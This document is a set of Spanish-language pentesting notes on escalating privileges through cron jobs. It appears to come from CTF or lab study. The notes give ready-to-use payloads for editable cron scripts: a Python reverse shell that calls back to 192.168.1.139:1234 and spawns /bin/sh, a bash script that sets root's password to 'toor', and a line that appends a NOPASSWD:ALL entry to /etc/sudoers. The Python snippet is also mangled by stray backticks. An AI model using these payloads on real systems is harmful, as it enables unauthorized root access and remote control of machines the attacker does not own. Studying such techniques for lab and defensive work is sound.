### Tareas cron
### Binarios que pueden verse afectados por una tarea cron
Cuando tenemos un fichero por ejemplo **/home/eddy/backup.bk**, puede ser que sea un backup realizado a través de una tarea cron, pero no la podamos ver. Para localizar el binario que realiza ese backup e intentar escalar privilegios por ahí se puede buscar binarios que contengan esa línea, ej:
```bash
grep -rnw / -e "/home/eddy/backup.bk"

y en el resultado seguramente veamos un script que llame a ese fichero y podamos tirar por ahí. (esto es bastante frecuente, solo tenemos que ir acotando el lugar de búsqueda, ya que desde la raíz quizás tarde mucho en encontrar ese script). Por ejemplo podemos buscar en /usr o /opt
```


##### Tarea cron python (reverse shell)
Si es editable añadimos el siguiente codigo para establecer una reverse shell con tareas cron. (y nos ponemos a la escucha):
```python 
`#!/bin/python3`

`import sys`

`import time`

`import subprocess`

`from pwn import *`

`if` `__name__ ==` `"__main__"``:`

    `s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((``"192.168.1.139"``,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([``"/bin/sh"``,``"-i"``])`
```

##### Tarea cron python no editable
Podriamos tratar de mirar si podemos editar librerias o podemos escribir en el directorio donde está alojado el *.py*, ya sea porque nuestro usuario o nuestro grupo pueda hacerlo.  Mirar sección Python Library hijacking.


##### Tarea cron bash (cambio contraseña root)
Si es editable, podemos meterle lo siguiente:

Este script, establece al usuario root, la **contraseña: "toor"**
```bash
#!/bin/bash  
echo -e "toor\ntoor" | passwd root
```

Este script permite al usuario en cuestión ejecutar cualquier comando como root:
```bash
#!/bin/bash  
echo "usuario ALL=NOPASSWD:ALL" >> /etc/sudoers  
```

Bastaría con hacer sudo su, y ya somos root